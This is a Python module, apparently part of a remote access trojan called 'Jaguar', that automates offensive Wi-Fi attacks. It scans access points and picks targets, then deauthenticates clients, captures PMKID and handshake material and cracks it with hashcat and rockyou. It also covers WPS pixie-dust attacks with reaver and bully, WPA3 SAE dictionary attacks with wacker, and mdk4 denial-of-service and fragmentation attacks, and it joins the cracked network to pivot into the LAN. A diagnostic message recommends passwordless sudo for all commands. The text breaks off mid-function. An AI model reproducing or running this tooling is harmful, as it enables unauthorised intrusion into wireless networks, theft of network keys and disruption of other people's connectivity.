# -*- coding: utf-8 -*-
"""wifi_ofensivo.py — módulo 802.11 ofensivo de Jaguar (100% offline, sin internet).

Cadena completa, estilo airgeddon pero integrada en el RAT:

    escaneo (monitor / nmcli)  ->  elegir AP por señal (dBm)
      WPA2 / WPA2-WPA3 transición : PMKID clientless (hcxdumptool)
                                    o deauth + handshake (aireplay-ng)
      -> hcxpcapngtool -o hash.22000  ->  hashcat -m 22000  ->  PSK
      WPA2 con WPS                : reaver -K 1 (pixie-dust) / bully
      WPA3 puro (SAE)             : wacker (diccionario online) + mdk4 auth-DoS
      FragAttacks                 : mdk4 modo f
      -> conectar la interfaz a la red obtenida para pivotar en la LAN

Solo stdlib. Los binarios externos se detectan y se reportan en herramientas().

SOPORTA:
  - Linux nativo (root o sudo -n NOPASSWD)
  - Windows -> WSL2 (con la tarjeta pasada por usbipd) ; backend "wsl"

RESTAURACIÓN DE RED: monitor_off() deja la tarjeta en managed y levanta de nuevo
NetworkManager / wpa_supplicant / DHCP. NO hace falta reiniciar.
"""

import csv
import glob
import ipaddress
import os
import re
import shlex
import shutil
import socket
import subprocess
import sys
import tempfile
import time

ES_WIN = sys.platform.startswith("win")
_TMP = os.path.join(tempfile.gettempdir(), "jaguar_wifi")
try:
    os.makedirs(_TMP, exist_ok=True)
except OSError:
    pass

_BACKEND = None
_WSL_DISTRO = ""
_BASE_IFACE = None


# ===========================================================================
#  Backend (linux / wsl / windows) y ejecución
# ===========================================================================
def backend():
    """'linux' | 'wsl' | 'windows'. Se autodetecta una sola vez."""
    global _BACKEND, _WSL_DISTRO
    if _BACKEND is not None:
        return _BACKEND
    if not ES_WIN:
        _BACKEND = "linux"
        return _BACKEND
    if shutil.which("wsl"):
        try:
            r = subprocess.run(["wsl", "-e", "bash", "-lc", "command -v airmon-ng"],
                               capture_output=True, text=True, timeout=40,
                               errors="replace")
            if (r.stdout or "").strip():
                try:
                    d = subprocess.run(["wsl", "-l", "-q"], capture_output=True,
                                       text=True, timeout=25, errors="replace")
                    distros = [x.strip().replace("\x00", "")
                               for x in (d.stdout or "").splitlines() if x.strip()]
                    _WSL_DISTRO = distros[0] if distros else ""
                except Exception:
                    _WSL_DISTRO = ""
                _BACKEND = "wsl"
                return _BACKEND
        except Exception:
            pass
    _BACKEND = "windows"
    return _BACKEND


def _es_root():
    try:
        return os.geteuid() == 0
    except AttributeError:
        return True


def _sudo_sin_password():
    if backend() == "wsl":
        return True
    if _es_root():
        return True
    if not shutil.which("sudo"):
        return False
    try:
        r = subprocess.run(["sudo", "-n", "true"], capture_output=True, timeout=15)
        return r.returncode == 0
    except Exception:
        return False


SUDO = "" if (_es_root() or ES_WIN or not shutil.which("sudo")) else "sudo -n"


def _shell_str(args):
    return " ".join(shlex.quote(str(a)) for a in args)


def _cmd(args, sudo=True):
    args = [str(a) for a in args]
    if backend() == "wsl":
        linea = _shell_str(args)
        cmd = ["wsl"]
        if _WSL_DISTRO:
            cmd += ["-d", _WSL_DISTRO]
        cmd += ["-u", "root", "-e", "bash", "-lc", linea]
        return cmd
    if sudo and SUDO:
        return SUDO.split() + args
    return args


def _run(args, timeout=60, sudo=True, cwd=None):
    cmd = _cmd(args, sudo=sudo)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                           cwd=cwd, errors="replace")
        return r.returncode, ((r.stdout or "") + (r.stderr or ""))
    except subprocess.TimeoutExpired as e:
        out = e.stdout or ""
        if isinstance(out, bytes):
            out = out.decode("utf-8", "replace")
        return 124, out
    except FileNotFoundError:
        return 127, "no encontrado: " + str(args[0])
    except Exception as e:
        return 1, str(e)


def _pop(args, sudo=True):
    try:
        p = subprocess.Popen(_cmd(args, sudo=sudo), stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
        try:
            p._jaguar_bin = str(args[0])
        except Exception:
            pass
        return p
    except Exception:
        return None


def _pop_stream(args, sudo=True):
    try:
        p = subprocess.Popen(_cmd(args, sudo=sudo), stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, text=True,
                             errors="replace", bufsize=1)
        try:
            p._jaguar_bin = str(args[0])
        except Exception:
            pass
        return p
    except Exception:
        return None


def _terminar(proc):
    if not proc:
        return
    try:
        proc.terminate()
        proc.wait(timeout=6)
    except Exception:
        try:
            proc.kill()
        except Exception:
            pass
    # En WSL el terminate de Windows no siempre mata al hijo de Linux
    if backend() == "wsl":
        nombre = getattr(proc, "_jaguar_bin", "")
        if nombre:
            _run(["pkill", "-f", nombre], timeout=15)


def _int(v, defecto=0):
    try:
        return int(str(v).strip())
    except (TypeError, ValueError):
        return defecto


def _limpio(datos, limite=600):
    if datos is None:
        return ""
    if isinstance(datos, bytes):
        datos = datos.decode("latin-1", "ignore")
    datos = "".join(c if (32 <= ord(c) < 127 or c in "\r\n\t") else "." for c in datos)
    return datos[:limite]


def _limpiar_temporales(prefijo):
    for f in glob.glob(prefijo + "*"):
        try:
            os.remove(f)
        except OSError:
            pass


def _freq_a_canal(f):
    if 2412 <= f <= 2484:
        return "14" if f == 2484 else str(int((f - 2407) / 5))
    if 5180 <= f <= 5825:
        return str(int((f - 5000) / 5))
    if 5955 <= f <= 7115:
        return str(int((f - 5950) / 5))
    return ""


def _existe_bin(binario):
    """Busca un binario, incluso dentro de WSL."""
    if ES_WIN and backend() == "wsl":
        rc, out = _run(["command", "-v", binario], sudo=False, timeout=20)
        salida = (out or "").strip().splitlines()
        return salida[-1].strip() if rc == 0 and salida else ""
    return shutil.which(binario) or ""


def _existe_ruta(ruta):
    """os.path.isfile que funciona también para rutas dentro de WSL."""
    if not ruta:
        return False
    if ES_WIN and backend() == "wsl":
        rc, _ = _run(["test", "-s", ruta], sudo=False, timeout=20)
        return rc == 0
    return os.path.isfile(ruta)


def _leer_archivo(ruta):
    if ES_WIN and backend() == "wsl":
        rc, out = _run(["cat", ruta], sudo=False, timeout=60)
        return out if rc == 0 else ""
    try:
        with open(ruta, encoding="utf-8", errors="replace") as f:
            return f.read()
    except OSError:
        return ""


# ===========================================================================
#  Herramientas
# ===========================================================================
_HERRAMIENTAS = {
    "airmon-ng": "monitor", "airodump-ng": "captura", "aireplay-ng": "inyeccion",
    "aircrack-ng": "crack", "hcxdumptool": "pmkid", "hcxpcapngtool": "conversion",
    "hashcat": "crack", "john": "crack", "reaver": "wps", "wash": "wps",
    "bully": "wps", "pixiewps": "wps", "mdk4": "inyeccion",
    "iw": "escaneo", "iwconfig": "escaneo", "ip": "interfaz",
    "nmcli": "escaneo/conexion", "wpa_supplicant": "conexion",
    "dhclient": "dhcp", "hostapd": "evil twin", "dnsmasq": "evil twin",
}

_WPA3_SCRIPTS = ("wacker", "DragonShift")

_ESENCIALES = ("airmon-ng", "airodump-ng", "aireplay-ng", "iw",
               "hcxdumptool", "hcxpcapngtool", "hashcat")


def herramientas():
    res = {}
    for binario, uso in _HERRAMIENTAS.items():
        ruta = _existe_bin(binario)
        res[binario] = {"ok": bool(ruta), "ruta": ruta or "", "uso": uso}
    for extra in _WPA3_SCRIPTS:
        ruta = _existe_bin(extra) or _buscar_script(extra)
        res[extra] = {"ok": bool(ruta), "ruta": ruta or "", "uso": "wpa3"}
    return res


def _buscar_script(nombre):
    cands = [
        os.path.expanduser(f"~/{nombre}/{nombre}.py"),
        os.path.expanduser(f"~/tools/{nombre}/{nombre}.py"),
        os.path.expanduser(f"~/Downloads/{nombre}/{nombre}.py"),
        f"/opt/{nombre}/{nombre}.py",
        f"/usr/local/bin/{nombre}.py",
    ]
    for c in cands:
        if _existe_ruta(c):
            return c
    return ""


def faltantes():
    return sorted(k for k, v in herramientas().items() if not v["ok"])


def esenciales_faltan():
    return [k for k in _ESENCIALES if not herramientas().get(k, {}).get("ok")]


def hay_stack():
    return not esenciales_faltan()


def resumen_herramientas():
    lineas = []
    for k, v in sorted(herramientas().items()):
        lineas.append(("  [OK] " if v["ok"] else "  [--] ") + f"{k:<16} {v['uso']}")
    return "\n".join(lineas)


def diccionarios():
    cands = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/wordlists/rockyou",
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt",
        "/usr/share/seclists/Passwords/Common-Credentials/"
        "10-million-password-list-top-1000000.txt",
        os.path.expanduser("~/rockyou.txt"),
        os.path.expanduser("~/wordlists/rockyou.txt"),
        "/opt/wordlists/rockyou.txt",
    ]
    vistos, out = set(), []
    for c in cands:
        if c not in vistos and _existe_ruta(c):
            vistos.add(c)
            out.append(c)
    return out


# ===========================================================================
#  Diagnóstico
# ===========================================================================
def diagnostico():
    b = backend()
    lineas = [f"backend: {b} | Windows: {ES_WIN} | root: {_es_root()} "
              f"| sudo -n: {_sudo_sin_password()}"]

    if b == "windows":
        lineas.append("")
        lineas.append("*** Windows NO tiene modo monitor nativo. ***")
        lineas.append("Solucion: instala el stack dentro de WSL2 y pasa la tarjeta USB.")
        lineas.append("  1) winget install --interactive --exact dorssel.usbipd-win")
        lineas.append("  2) usbipd list")
        lineas.append("  3) usbipd bind --busid <ID>")
        lineas.append("  4) usbipd attach --wsl --busid <ID>")
        lineas.append("  5) en WSL:  sudo apt install aircrack-ng hcxtools hashcat \\")
        lineas.append("              reaver bully mdk4 iw wpasupplicant hostapd dnsmasq")
        lineas.append("")
        lineas.append("Adaptadores WLAN vistos por Windows: "
                      + (", ".join(interfaces_windows()) or "ninguno"))
        return "\n".join(lineas)

    lineas.append(f"interfaces detectadas: {', '.join(interfaces()) or 'NINGUNA'}")
    lineas.append(f"esenciales que faltan: {', '.join(esenciales_faltan()) or 'ninguna'}")
    if not _es_root() and not _sudo_sin_password():
        lineas.append("")
        lineas.append("*** sudo pide contraseña y la GUI no tiene tty -> falla. ***")
        lineas.append("Arreglalo con:  echo \"$USER ALL=(ALL) NOPASSWD: ALL\" | "
                      "sudo tee /etc/sudoers.d/jaguar")
    if b == "wsl":
        lineas.append("")
        lineas.append("WSL detectado: la tarjeta debe estar pasada con usbipd attach.")
        lineas.append("Comprueba con:  iw dev   (debe aparecer la tarjeta)")
    return "\n".join(lineas)


# ===========================================================================
#  Interfaces y modo monitor
# ===========================================================================
def interfaces_windows():
    if not ES_WIN:
        return []
    try:
        r = subprocess.run(["netsh", "wlan", "show", "interfaces"],
                           capture_output=True, text=True, errors="replace")
        salida = r.stdout or ""
    except Exception:
        return []
    nombres = re.findall(r"^\s*(?:Name|Nombre)\s*:\s*(.+)$", salida, re.MULTILINE)
    return [n.strip() for n in nombres if n.strip()]


def interfaces():
    """Todas las interfaces inalámbricas (incluye mon). Sin depender de binarios."""
    if ES_WIN and backend() != "wsl":
        return interfaces_windows()

    devs = []
    # 1) /sys: funciona sin root y sin herramientas
    try:
        for nombre in sorted(os.listdir("/sys/class/net")):
            if os.path.isdir(f"/sys/class/net/{nombre}/wireless"):
                devs.append(nombre)
    except OSError:
        pass
    # 2) iw dev (incluye interfaces en modo monitor)
    if _existe_bin("iw"):
        _, out = _run(["iw", "dev"], sudo=False)
        for d in re.findall(r"Interface\s+(\S+)", out):
            if d not in devs:
                devs.append(d)
    # 3) airmon-ng
    if not devs and _existe_bin("airmon-ng"):
        _, out = _run(["airmon-ng"], sudo=False)
        for l in out.splitlines()[2:]:
            p = l.split()
            if p and p[0] not in devs:
                devs.append(p[0])
    # 4) iwconfig
    if not devs and _existe_bin("iwconfig"):
        _, out = _run(["iwconfig"], sudo=False)
        for l in out.splitlines():
            if "IEEE 802.11" in l and l.split():
                devs.append(l.split()[0])
    return devs


def es_monitor(iface):
    if not iface:
        return False
    try:
        if os.path.isdir(f"/sys/class/net/{iface}"):
            with open(f"/sys/class/net/{iface}/type") as f:
                if f.read().strip() == "803":
                    return True
    except OSError:
        pass
    _, out = _run(["iw", "dev", iface, "info"], sudo=False)
    return "type monitor" in out.lower()


def listar_monitores():
    return [i for i in interfaces() if es_monitor(i)]


def _existe_iface(iface):
    if not iface:
        return False
    if ES_WIN and backend() != "wsl":
        return True
    return os.path.isdir(f"/sys/class/net/{iface}")


def monitor_on(iface):
    """Activa modo monitor. Devuelve el nombre de la interfaz mon o None."""
    global _BASE_IFACE
    if not iface:
        return None
    if es_monitor(iface):
        _BASE_IFACE = iface
        return iface
    _BASE_IFACE = iface

    if _existe_bin("airmon-ng"):
        # check kill libera la tarjeta (mata NetworkManager/wpa_supplicant/dhclient)
        _run(["airmon-ng", "check", "kill"], timeout=60)
        _, out = _run(["airmon-ng", "start", iface], timeout=90)
        for patron in (r"monitor mode (?:enabled|vif enabled).*?on\s*(?:\[phy\d+\])?(\S+?)\)",
                       r"monitor mode.*?on\s*(?:\[phy\d+\])?(\S+?)\)",
                       r"on \[phy\d+\]([\w]+mon)",
                       r"(\w+mon)\b"):
            m = re.search(patron, out)
            if m:
                cand = m.group(1).strip()
                if cand != "on":
                    if es_monitor(cand):
                        return cand
                    return cand

    # fallback manual
    _run(["ip", "link", "set", iface, "down"])
    _run(["iw", iface, "set", "type", "monitor"])
    _run(["ip", "link", "set", iface, "up"])
    if es_monitor(iface):
        return iface
    return None


def restaurar_red(iface=None):
    """Devuelve la red al estado normal. Es lo que evita el reinicio."""
    informe = []

    def _h(args, timeout=40, etiqueta=None):
        rc, _out = _run(args, timeout=timeout)
        informe.append(f"{'[OK] ' if rc == 0 else '[--] '}"
                       f"{(etiqueta or ' '.join(str(a) for a in args))}")
        return rc

    objetivo = iface if _existe_iface(iface) else None

    if objetivo:
        _h(["ip", "link", "set", objetivo, "down"], etiqueta=f"bajar {objetivo}")
        _h(["iw", objetivo, "set", "type", "managed"], etiqueta=f"{objetivo} -> managed")
        _h(["ip", "link", "set", objetivo, "up"], etiqueta=f"subir {objetivo}")

    # NetworkManager (airmon-ng check kill lo mata -> hay que levantarlo)
    if _existe_bin("systemctl"):
        _h(["systemctl", "start", "NetworkManager"],
           etiqueta="systemctl start NetworkManager")
    elif _existe_bin("service"):
        _h(["service", "NetworkManager", "start"],
           etiqueta="service NetworkManager start")

    if _existe_bin("nmcli"):
        _h(["nmcli", "radio", "wifi", "on"], etiqueta="nmcli radio wifi on")
        _h(["nmcli", "networking", "on"], etiqueta="nmcli networking on")
        if objetivo:
            _h(["nmcli", "device", "set", objetivo, "managed", "yes"],
               etiqueta=f"nmcli: {objetivo} gestionada por NM")
            _h(["nmcli", "device", "connect", objetivo],
               etiqueta=f"nmcli: reconectar {objetivo}")

    if _existe_bin("systemctl"):
        _h(["systemctl", "restart", "wpa_supplicant"],
           etiqueta="systemctl restart wpa_supplicant")

    if objetivo:
        for d in (["dhclient", "-1", objetivo], ["dhcpcd", objetivo],
                  ["udhcpc", "-i", objetivo]):
            if _existe_bin(d[0]):
                _h(d, etiqueta=f"DHCP con {d[0]}")
                break

    # cualquier otra mon colgando
    for m in listar_monitores():
        if m != objetivo:
            _h(["iw", m, "set", "type", "managed"], etiqueta=f"{m} -> managed")

    return "\n".join(informe)


def monitor_off(mon=None, base=None):
    """Apaga modo monitor y RESTAURA la red. No hace falta reiniciar."""
    global _BASE_IFACE
    base = base or _BASE_IFACE
    iface = mon or base

    candidatos = []
    for i in (iface, base):
        if i and i not in candidatos:
            candidatos.append(i)
    for m in listar_monitores():
        if m not in candidatos:
            candidatos.append(m)

    for i in candidatos:
        if _existe_iface(i) and es_monitor(i) and _existe_bin("airmon-ng"):
            _run(["airmon-ng", "stop", i], timeout=60)

    for i in candidatos:
        if _existe_iface(i) and es_monitor(i):
            _run(["ip", "link", "set", i, "down"])
            _run(["iw", i, "set", "type", "managed"])
            _run(["ip", "link", "set", i, "up"])

    informe = restaurar_red(base or iface)
    _BASE_IFACE = None
    return informe


def ip_de(iface):
    _, out = _run(["ip", "-4", "addr", "show", iface], sudo=False)
    ips = re.findall(r"inet\s+(\d+\.\d+\.\d+\.\d+/\d+)", out)
    return "IP: " + ", ".join(ips) if ips else "sin IP (revisa DHCP)"


def subred_de(iface):
    _, out = _run(["ip", "-4", "addr", "show", iface], sudo=False)
    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", out)
    if not m:
        return ""
    return str(ipaddress.ip_network(m.group(1) + "/" + m.group(2), strict=False))


# ===========================================================================
#  Escaneo de APs (3 backends: airodump / nmcli / iw)
# ===========================================================================
def _clasificar(ap):
    texto = ((ap.get("cifrado") or "") + " " + (ap.get("auth") or "")).upper()
    ap["wpa3"] = ("SAE" in texto) or ("WPA3" in texto)
    ap["wpa2"] = ("WPA2" in texto) or ("PSK" in texto) or ("WPA" in texto)
    ap["wep"] = "WEP" in texto
    ap["abierta"] = not (ap["wpa3"] or ap["wpa2"] or ap["wep"])
    ap["transicion"] = bool(ap["wpa3"] and (ap["wpa2"] or "PSK" in texto))
    if ap["wpa3"]:
        ap["seguridad"] = "WPA3 (transicion)" if ap["transicion"] else "WPA3-SAE"
    elif ap["wpa2"]:
        ap["seguridad"] = "WPA2-PSK"
    elif ap["wep"]:
        ap["seguridad"] = "WEP"
    else:
        ap["seguridad"] = "ABIERTA"
    ap["recomendado"] = _recomendar_ataque(ap)
    return ap


def _recomendar_ataque(ap):
    if ap.get("abierta"):
        return "entrar directo (sin cifrado)"
    if ap.get("wep"):
        return "WEP: aircrack-ng (IVs)"
    if ap.get("wps"):
        return "WPS: reaver -K 1 (pixie-dust) / bully"
    if ap.get("transicion"):
        return "PMKID clientless + DragonShift (downgrade a WPA2)"
    if ap.get("wpa3"):
        return "WPA3 puro: wacker (diccionario SAE online)"
    return "PMKID clientless; si falla, deauth + handshake"


def _escanear_airodump(iface, segundos=15):
    prefijo = os.path.join(_TMP, "scan")
    _limpiar_temporales(prefijo)
    proc = _pop(["airodump-ng", "--output-format", "csv", "-w", prefijo, iface])
    time.sleep(max(4, int(segundos)))
    _terminar(proc)
    aps, en_ap = [], True
    for csvf in glob.glob(prefijo + "*.csv"):
        try:
            fh = open(csvf, encoding="utf-8", errors="replace")
        except OSError:
            continue
        with fh:
            for fila in csv.reader(fh):
                if not fila or not fila[0].strip():
                    continue
                primera = fila[0].strip()
                if primera.startswith("BSSID"):
                    continue
                if primera.startswith("Station"):
                    en_ap = False
                    continue
                if not en_ap or len(fila) < 14:
                    continue
                ap = {"bssid": primera,
                      "canal": fila[3].strip(),
                      "senal": _int(fila[8], -100),
                      "cifrado": fila[5].strip(),
                      "auth": (fila[7].strip() if len(fila) > 7 else ""),
                      "essid": fila[13].strip(),
                      "wps": False}
                ap["banda"] = "5" if _int(ap["canal"], 0) > 14 else "2.4"
                _clasificar(ap)
                aps.append(ap)
    return aps


def _escanear_nmcli():
    """Escaneo sin modo monitor (funciona con la tarjeta en managed)."""
    if not _existe_bin("nmcli"):
        return []
    _, out = _run(["nmcli", "-t", "-f", "SSID,BSSID,CHAN,SIGNAL,SECURITY",
                   "dev", "wifi", "list", "--rescan", "yes"],
                  timeout=45, sudo=False)
    aps = []
    for ln in out.splitlines():
        partes = re.split(r"(?<!\\):", ln)
        if len(partes) < 5:
            continue
        ssid = partes[0].replace("\\:", ":").strip()
        bssid = partes[1].replace("\\:", ":").strip().upper()
        canal = partes[2].strip()
        try:
            pct = int(partes[3])
            senal = int(pct / 2 - 100)
        except (TypeError, ValueError):
            senal = -100
        seg = partes[4].strip()
        ap = {"bssid": bssid, "canal": canal, "senal": senal,
              "cifrado": seg, "auth": seg, "essid": ssid, "wps": False}
        ap["banda"] = "5" if _int(canal, 0) > 14 else "2.4"
        _clasificar(ap)
        aps.append(ap)
    return [a for a in aps if a["essid"]]


def _escanear_iw(iface):
    rc, out = _run(["iw", "dev", iface, "scan"], timeout=50)
    if rc != 0 and not out.strip() and _existe_bin("iwlist"):
        _, out = _run(["iwlist", iface, "scan"], timeout=50)
        return _parse_iwlist(out)
    aps, ap = [], None
    for ln in out.splitlines():
        s = ln.strip()
        if s.startswith("BSS "):
            if ap:
                aps.append(ap)
            ap = {"bssid": s.split()[1].split("(")[0].rstrip(":"),
                  "senal": -100, "canal": "", "essid": "", "cifrado": "",
                  "auth": "", "wps": False}
        elif ap is not None:
            if s.startswith("SSID:"):
                ap["essid"] = s.split(":", 1)[1].strip()
            elif s.startswith("signal:"):
                try:
                    ap["senal"] = int(float(s.split(":", 1)[1].strip().split()[0]))
                except Exception:
                    pass
            elif s.startswith("DS Parameter set: channel"):
                ap["canal"] = s.rsplit(" ", 1)[-1]
            elif s.startswith("primary channel:"):
                ap["canal"] = s.split(":", 1)[1].strip()
            elif s.startswith("freq:"):
                try:
                    f = float(s.split(":", 1)[1].strip())
                    if not ap["canal"]:
                        ap["canal"] = _freq_a_canal(f)
                except Exception:
                    pass
            elif "WPS" in s:
                ap["wps"] = True
            elif s.startswith(("RSN:", "WPA:", "* Authentication", "* Group cipher",
                               "* Pairwise", "* Capabilities", "* SAE", "* PSK")):
                ap["cifrado"] = (ap["cifrado"] + " " + s).strip()
                ap["auth"] = (ap["auth"] + " " + s).strip()
    if ap:
        aps.append(ap)
    for a in aps:
        a["banda"] = "5" if _int(a.get("canal"), 0) > 14 else "2.4"
        _clasificar(a)
    return [a for a in aps if a.get("essid")]


def _parse_iwlist(out):
    aps, ap = [], None
    for ln in out.splitlines():
        s = ln.strip()
        if s.startswith("Cell "):
            if ap:
                aps.append(ap)
            m = re.search(r"Address:\s*(\S+)", s)
            ap = {"bssid": m.group(1) if m else "", "senal": -100, "canal": "",
                  "essid": "", "cifrado": "", "auth": "", "wps": False}
        elif ap is not None:
            if s.startswith("ESSID:"):
                ap["essid"] = s.split(":", 1)[1].strip().strip('"')
            elif s.startswith("Channel:"):
                ap["canal"] = s.split(":", 1)[1].strip()
            elif s.startswith("Signal level="):
                m = re.search(r"level=(-?\d+)", s)
                if m:
                    ap["senal"] = _int(m.group(1), -100)
            elif s.startswith("Encryption key:"):
                ap["cifrado"] += " " + s.split(":", 1)[1]
            elif "WPA3" in s or "SAE" in s:
                ap["auth"] += " SAE"
            elif "WPA2" in s:
                ap["auth"] += " WPA2"
            elif "WPS" in s:
                ap["wps"] = True
    if ap:
        aps.append(ap)
    for a in aps:
        a["banda"] = "5" if _int(a.get("canal"), 0) > 14 else "2.4"
        _clasificar(a)
    return [a for a in aps if a.get("essid")]


def escanear(iface, segundos=15, banda=None):
    """Escanea APs con el mejor backend disponible. Ordena por señal."""
    aps = []
    if iface and es_monitor(iface):
        aps = _escanear_airodump(iface, segundos)
    if not aps and not ES_WIN and _existe_bin("nmcli"):
        aps = _escanear_nmcli()
    if not aps and iface:
        aps = _escanear_iw(iface)
    if not aps and ES_WIN and _existe_bin("nmcli"):
        aps = _escanear_nmcli()

    unicos = {}
    for a in aps:
        prev = unicos.get(a["bssid"])
        if not prev or a.get("senal", -100) > prev.get("senal", -100):
            unicos[a["bssid"]] = a
    aps = list(unicos.values())
    if banda and banda not in ("todas", ""):
        aps = [a for a in aps if a.get("banda") == banda]
    aps.sort(key=lambda a: a.get("senal", -100), reverse=True)
    return aps


def mejor_ap(aps, solo_cifradas=True):
    cands = [a for a in aps if a.get("essid")]
    if solo_cifradas:
        cands = [a for a in cands if not a.get("abierta")] or cands
    if not cands:
        return None
    return max(cands, key=lambda a: a.get("senal", -100))


# ===========================================================================
#  Captura: PMKID / handshake  y conversión a hashcat 22000
# ===========================================================================
def deauth(mon, bssid, veces=5, cliente=None):
    if not _existe_bin("aireplay-ng"):
        return "aireplay-ng no instalado"
    args = ["aireplay-ng", "--deauth", str(veces), "-a", bssid]
    if cliente:
        args += ["-c", cliente]
    args.append(mon)
    _, out = _run(args, timeout=30)
    return out.strip() or f"deauth x{veces} enviado"


def capturar_pmkid(mon, bssid, canal, segundos=25):
    """Captura PMKID sin clientes (hcxdumptool) o handshake con deauth."""
    prefijo = os.path.join(_TMP, "pmkid_" + bssid.replace(":", ""))
    _limpiar_temporales(prefijo)
    if canal:
        _run(["iw", mon, "set", "channel", str(canal)])

    if _existe_bin("hcxdumptool"):
        filtro = prefijo + ".txt"
        with open(filtro, "w", encoding="utf-8") as f:
            f.write(bssid.replace(":", "").upper() + "\n")
        pcapng = prefijo + ".pcapng"
        proc = _pop(["hcxdumptool", "-i", mon, "-o", pcapng,
                     "--filterlist_ap=" + filtro, "--filtermode=2",
                     "--enable_status=1"])
        time.sleep(max(10, int(segundos)))
        _terminar(proc)
        return pcapng

    proc = _pop(["airodump-ng", "--bssid", bssid, "-w", prefijo]
                + (["-c", str(canal)] if canal else []) + [mon])
    time.sleep(2)
    deauth(mon, bssid, 6)
    time.sleep(max(5, int(segundos) - 3))
    _terminar(proc)
    caps = glob.glob(prefijo + "*.cap") + glob.glob(prefijo + "*.pcap")
    return caps[0] if caps else (prefijo + ".cap")


def convertir(captura):
    """pcap/pcapng -> hashcat modo 22000 con hcxpcapngtool."""
    if not captura or not _existe_ruta(captura):
        return "", "captura inexistente"
    if not _existe_bin("hcxpcapngtool"):
        return "", "hcxpcapngtool no instalado (paquete hcxtools)"
    salida = captura.rsplit(".", 1)[0] + ".22000"
    _, out = _run(["hcxpcapngtool", "-o", salida, captura], timeout=240)
    if not _existe_ruta(salida):
        return "", (out.strip()[-1200:] or "sin hashes en la captura")
    return salida, out.strip()[-1200:]


def _leer_psk(ruta):
    for ln in _leer_archivo(ruta).splitlines():
        ln = ln.strip()
        if not ln:
            continue
        return ln.rsplit(":", 1)[1] if ":" in ln else ln
    return ""


def crackear(hash22000, wordlist, log=None, timeout=1800, reglas=None):
    """hashcat -m 22000. Devuelve (psk, metodo)."""
    if not _existe_ruta(hash22000):
        return "", "hash no encontrado"
    if not wordlist or not _existe_ruta(wordlist):
        return "", "wordlist no encontrada: " + str(wordlist)
    if not _existe_bin("hashcat"):
        return _crackear_aircrack(hash22000, wordlist)

    salida = hash22000 + ".out"
    pot = hash22000 + ".pot"
    try:
        os.remove(salida)
    except OSError:
        pass
    cmd = ["hashcat", "-m", "22000", "-a", "0", "--force",
           "--potfile-path", pot, "-o", salida,
           "--status", "--status-timer=5", "--quiet"]
    if reglas:
        cmd += ["-r", reglas]
    cmd += [hash22000, wordlist]

    proc = _pop_stream(cmd, sudo=False)
    if not proc:
        return "", "no pude lanzar hashcat"
    t0 = time.time()
    for ln in proc.stdout:
        txt = ln.rstrip()
        if log and any(k in txt for k in ("Progress", "Speed", "Recovered",
                                          "Status", "Candidates")):
            log(txt)
        if time.time() - t0 > timeout:
            proc.terminate()
            break
    try:
        proc.wait(timeout=10)
    except Exception:
        proc.kill()
    psk = _leer_psk(salida)
    return (psk, "hashcat") if psk else ("", "hashcat sin resultado en el diccionario")


def _crackear_aircrack(hash22000, wordlist):
    if not _existe_bin("aircrack-ng"):
        return "", "ni hashcat ni aircrack-ng instalados"
    _, out = _run(["aircrack-ng", "-w", wordlist, hash22000], timeout=1800)
    m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", out)
    return (m.group(1), "aircrack") if m else ("", out.strip()[-800:])


# ===========================================================================
#  WPS (reaver / bully) — WPA2
# ===========================================================================
def wps_escanear(mon, segundos=14):
    if not _existe_bin("wash"):
        return []
    _, out = _run(["wash", "-i", mon], timeout=segundos)
    aps = []
    for ln in out.splitlines()[2:]:
        p = ln.split()
        if len(p) >= 5:
            aps.append({"bssid": p[0], "canal": p[1], "senal": _int(p[2], -100),
                        "wps": p[3], "essid": " ".join(p[5:])})
    return aps


def wps_comando(tecnica, mon, bssid, canal, pin=""):
    if tecnica == "bully":
        if not _existe_bin("bully"):
            return None, "bully no instalado"
        return ["bully", "-b", bssid, "-c", str(canal), "-d", mon], ""
    if not _existe_bin("reaver"):
        return None, "reaver no instalado"
    if tecnica == "pixie":
        return ["reaver", "-K", "1", "-i", mon, "-b", bssid, "-c", str(canal),
                "-vv", "-N"], ""
    if tecnica == "pin" and pin:
        return ["reaver", "-i", mon, "-b", bssid, "-c", str(canal),
                "-p", pin, "-vv"], ""
    return ["reaver", "-i", mon, "-b", bssid, "-c", str(canal), "-vv", "-N"], ""


def correr_wps(cmd, log=None, timeout=600):
    proc = _pop_stream(cmd, sudo=False)
    if not proc:
        return ""
    t0, psk = time.time(), ""
    for ln in proc.stdout:
        txt = ln.rstrip()
        if log:
            log(txt)
        m = re.search(r"WPA PSK:\s*'?(.+?)'?\s*$", txt)
        if m:
            psk = m.group(1).strip()
            break
        if time.time() - t0 > timeout:
            proc.terminate()
            break
    try:
        proc.wait(timeout=8)
    except Exception:
        proc.kill()
    return psk


# ===========================================================================
#  WPA3 — SAE
# ===========================================================================
def wpa3_wacker(iface, ssid, bssid, wordlist, ruta=None, log=None, timeout=1200):
    script = ruta or _buscar_script("wacker") or _existe_bin("wacker") or ""
    if not script:
        return "", ("wacker no encontrado. git clone "
                    "https://github.com/blunderbuss-wctf/wacker")
    cmd = [sys.executable if not ES_WIN else "python3", script,
           "--wordlist", wordlist, "--ssid", ssid, "--bssid", bssid,
           "--interface", iface]
    proc = _pop_stream(cmd, sudo=False)
    if not proc:
        return "", "no pude lanzar wacker"
    t0, psk = time.time(), ""
    for ln in proc.stdout:
        txt = ln.rstrip()
        if log:
            log(txt)
        low = txt.lower()
        if ("success" in low or "password" in low) and "=" in txt:
            psk = txt.split("=", 1)[1].strip().strip('"\'')
            if psk:
                break
        if time.time() - t0 > timeout:
            proc.terminate()
            break
    try:
        proc.wait(timeout=8)
    except Exception:
        proc.kill()
    return psk, "wacker"


def mdk4(mon, modo="a", segundos=60, extra=None, log=None):
    """a=auth-DoS (efectivo contra SAE) | e=EAPOL flood | f=fragmentación
    b=beacon flood | d=deauth amok"""
    if not _existe_bin("mdk4"):
        return "mdk4 no instalado"
    proc = _pop_stream(["mdk4", mon, modo] + list(extra or []), sudo=False)
    if not proc:
        return "no pude lanzar mdk4"
    t0 = time.time()
    for ln in proc.stdout:
        if log:
            log(ln.rstrip())
        if time.time() - t0 > segundos:
            proc.terminate()
            break
    try:
